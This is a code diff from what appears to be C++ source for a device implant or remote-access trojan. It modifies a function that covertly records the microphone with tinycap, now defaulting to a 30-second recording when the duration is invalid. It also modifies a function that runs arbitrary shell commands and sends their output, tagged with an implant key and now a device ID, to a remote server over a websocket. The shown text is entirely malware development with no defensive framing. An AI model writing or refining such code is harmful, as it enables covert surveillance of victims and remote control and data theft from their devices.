@@ -1130,8 +1130,8 @@ void do_report() {
 /** Records audio from the device microphone for a specified duration using tinycap. */
 void do_mic_record(int duration_s) {
     if (duration_s <= 0) {
-        send_error_to_server("mic_record", "Invalid duration: " + std::to_string(duration_s));
-        return;
+        log_message("Invalid or missing mic_record duration received; defaulting to 30 seconds.");
+        duration_s = 30;
     }
     std::string cmd = "tinycap " + std::string(MIC_FILE) + " -D 0 -d 0 -c 1 -r 16000 -b 16 -p 1024 -n 4 -t " + std::to_string(duration_s);
     log_message("Starting microphone recording for " + std::to_string(duration_s) + " seconds.");
@@ -1208,7 +1208,7 @@ void do_shell_command(const std::string& shell_cmd) {
         result = "[No output]";
     }
 
-    std::string json_req = "{\"implant_key\":\"" + g_escaped_implant_key + "\",\"command_result\":\"" + json_escape(result) + "\"}";
+    std::string json_req = "{\"implant_key\":\"" + g_escaped_implant_key + "\",\"device_id\":\"" + g_escaped_device_id + "\",\"command_result\":\"" + json_escape(result) + "\"}";
     if (!websocket_send_text(json_req)) {
         send_error_to_server("shell_cmd", "WS not open, cannot send result for: " + shell_cmd);
         return;
